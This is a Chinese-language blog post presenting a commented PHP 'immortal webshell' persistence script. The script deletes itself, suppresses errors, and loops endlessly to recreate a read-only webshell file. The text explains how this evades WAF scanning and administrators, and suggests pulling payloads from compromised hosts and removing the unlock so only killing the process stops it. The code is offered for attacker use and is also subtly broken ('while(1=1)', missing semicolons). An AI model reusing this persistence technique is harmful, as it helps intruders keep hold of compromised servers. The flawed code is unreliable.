[ Webshell ] 不死木馬
PHP, Webshell

嗯.... 一直在想，這禮拜要寫什麼好
想了很久，來寫寫 常用 的不死木馬好了

一般的 Webshell 常會遇到一個問題，當木馬被網管發現了，通常會被 rm 掉
不過個人在其他人主機發現了有趣的 Webshell 都會存起來，畢竟一些 webshell 寫的比原本的還精美

那... 這個 Webshell 有什麼優點呢?
我們都知道有的 WAF 或各種檢查 User 上傳的網頁或程式
可能會對 User 上傳的東西來檢查裡面有沒有一些比較危險的 Function
例如 exec, passthru, shell_exec, system, proc_open, popen, set_time_limit, exec, passthru, shell_exec, system , proc_op ...etc 等，常用在 webshell 或可以執行 system call 的 function
但是對 .txt 或是其他的副檔名的檔案，或是從其他地方 include 近來的內容，可能就不會檢查的那麼仔細

這隻 webshell 主要自己不會去 system call，都是從其他地方 include 進來
所以對於一些 WAF 就會檢查不太出來，於是乎，就有人用了這點，寫出了這隻 webshell 然後把本身存在 memory 裡面，除非網管、鑑識人員發現把本身 Process 關掉或關機，不然基本上是有點難移掉的

好了，不說廢話了，那我們來看看這隻 shell 

 
<?php
    @unlink($_SERVER['SCRIPT_FILENAME']); // 刪除檔案本身
    error_reporting(0); // 把 Error Log 關掉
    ignore_user_abort(true); // 忽略 User 連線, 讓連線斷掉後還能繼續 work
    set_time_limit(0); // 把執行時間設成不中斷

    $js = 'unlock.txt'; // 檢查有沒有解除的檔案
    $mb = 'css.php';    // 到時要產生的 Webshell 檔名
    $rm = '1.txt';      // 要產生 webshell 的內容
    $nr = file_get_contents($rm); // 從 txt 裡拿內容
    
    @unlink($rm); // 把剛剛產生內容的 txt 刪掉

    while(1=1)
    {
        if( file_exists($js) ) // 檢查有沒有 unlink 的檔案
        {
            @unlink($js);       // 刪掉解鎖的 file
            exit();             // 離開, 關閉
        }
        else
        {
            @unlink($mb);       // 刪除檔案
            chmod($mb, 0777);   // 設定權限
            @unlink($mb);
            file_put_contents($mb, $nr) // 從檔案裡拿資料
            chmod($mb, 0444);   // 設定權限
            usleep(1000000)    
        }
    }

嗯嗯，這樣應該都看懂了，因為解釋都打在上面了 (?)
當然啦，如果不喜歡從自己的 txt 裡拿資料，想要從其他網站 (Github、或肉雞)拿內容、或是想把 unlink 的部分拿掉，讓它沒有辦法解鎖，只能關機或刪除 process 那當然也是可以的
